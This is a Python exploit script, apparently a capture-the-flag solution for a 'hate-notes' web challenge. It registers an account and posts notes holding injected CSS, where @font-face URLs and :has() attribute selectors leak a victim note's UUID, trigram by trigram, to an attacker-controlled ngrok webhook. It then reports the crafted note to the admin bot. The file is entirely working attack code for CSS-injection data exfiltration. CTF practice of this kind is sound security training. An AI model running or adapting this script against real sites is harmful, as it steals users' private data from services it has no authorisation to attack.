import time
import itertools
import requests
import secrets
import string

SITE = "https://inst-6e7be7a7b323c510-hate-notes.chal.crewc.tf/"
WEBHOOK = "https://a54bd6cd79a1.ngrok-free.app"

START = ");}\n"

TRIGRAM_TEMPLATE = """
@font-face {font-family: "%s";src: url("%s");}

:root:has(#notesList > li:nth-child(2) > a[href*="%s"]) {
    background-color: red;
    --ff-%s: "%s" !important;
}

"""

FINAL = """

h2{
    font-family: %s
}

"""


def create_note(cookie, title, content):
    r = s.post(f"{SITE}/api/notes", data={
        "title": title,
        "content": content
    }, cookies={
        "token": cookie
    })

    print(r.text)

    r.raise_for_status()

    return r.json()["id"]

def all_uuid_ngrams(n):
    alphabet = "0123456789abcdef-"
    for combo in itertools.product(alphabet, repeat=n):
        yield "".join(combo)


s = requests.Session()
random_username = ''.join(secrets.choice(string.ascii_letters) for _ in range(8))
random_password = ''.join(secrets.choice(string.ascii_letters) for _ in range(8))

r = s.post(f"{SITE}/api/auth/register", data={
    "email": random_username,
    "password": random_password,
})

r.raise_for_status()

r = s.post(f"{SITE}/api/auth/login", data={
    "email": random_username,
    "password": random_password,
})

r.raise_for_status()


all_trigrams = list(all_uuid_ngrams(3))
final = ""

alphabet = "0123456789abcdef-"
first_order = ['-'] + list("0123456789abcdef")

for first in first_order:
    print("starting new char")  # <- as requested

    # all trigrams starting with `first`
    trigrams_for_first = [first + "".join(t) for t in itertools.product(alphabet, repeat=2)]


    note_ids = []

    BLOCK_LEN = 25

    final_block = ""

    for block in [trigrams_for_first[x:x+BLOCK_LEN] for x in range(0, len(trigrams_for_first), BLOCK_LEN)]:
        cur = START
        for trigram in block:
            r = secrets.token_hex(3)
            cur += TRIGRAM_TEMPLATE % (trigram,f"{WEBHOOK}/{trigram}",trigram,trigram,trigram)

        final_block += ','.join(f"var(--ff-{x},none)" for x in block) + ","

        note_id = create_note(s.cookies.get("token"), "b{a:url(", cur)
        print(note_id)
        note_ids.append(note_id)

    print(note_ids)

    final_id = create_note(s.cookies.get("token"), "b{a:url(", ");}"+FINAL % (final_block[:-1] + "!important ;"))

    print("FINAL ID", final_id)

    stylesheets = ""

    note_ids.append(final_id)

    for note_id in note_ids:
        stylesheets += f"<link rel=stylesheet href=/static/api/notes/{note_id}>"

    exp_id = create_note(s.cookies.get("token"), "helo", stylesheets)

    print(exp_id)
    time.sleep(1)
    r = s.post(f"{SITE}/report", data={
        "noteId": exp_id
    })

    print(r.text)
